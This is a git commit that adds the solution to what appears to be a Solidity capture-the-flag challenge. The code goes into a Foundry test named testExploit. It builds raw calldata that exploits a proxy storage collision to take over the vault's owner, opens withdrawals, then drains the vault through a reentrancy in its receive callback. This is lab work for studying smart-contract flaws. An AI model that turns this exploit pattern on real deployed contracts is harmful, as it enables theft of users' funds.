dace061bde2109192a3a6e27edc3e6779931f2a5
Soso <husosong@163.com>
2024-11-12 18:11:56 +0800

    Feature: Add hack code
    1. change owner
    2. openwithdraw
    3. deposite little ether
    4. withdraw all

--- test/Vault.t.sol
+++ test/Vault.t.sol
@@ -9,7 +9,7 @@ contract VaultExploiter is Test {
     VaultLogic public logic;
 
     address owner = address(1);
-    address palyer = address(2);
+    address hacker = address(this);
 
     function setUp() public {
         vm.deal(owner, 1 ether);
@@ -23,10 +23,30 @@ contract VaultExploiter is Test {
     }
 
     function testExploit() public {
-        vm.deal(palyer, 1 ether);
-        vm.startPrank(palyer);
+        vm.deal(hacker, 1 ether);
+        vm.startPrank(hacker);
 
-        // add your hacker code.
+        // Use password to change owner
+        bytes4 selector = bytes4(keccak256("changeOwner(bytes32,address)"));
+        bytes32 password = bytes32(uint256(uint160(address(logic))));
+
+        bytes memory callData = abi.encodePacked(
+            selector,
+            password,
+            uint256(uint160(hacker))
+        );
+
+        (bool success, ) = address(vault).call(callData);
+        assertEq(vault.owner(), hacker);
+
+        // Withdraw function need to be open first
+        vault.openWithdraw();
+        // deposite 0.01 ether will tigger the attack in receive callback
+        vault.deposite{value: 0.01 ether}();
+        console2.log("vault balance before attack:", address(vault).balance);
+
+        vault.withdraw();
+        console2.log("vault balance after attack:", address(vault).balance);
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
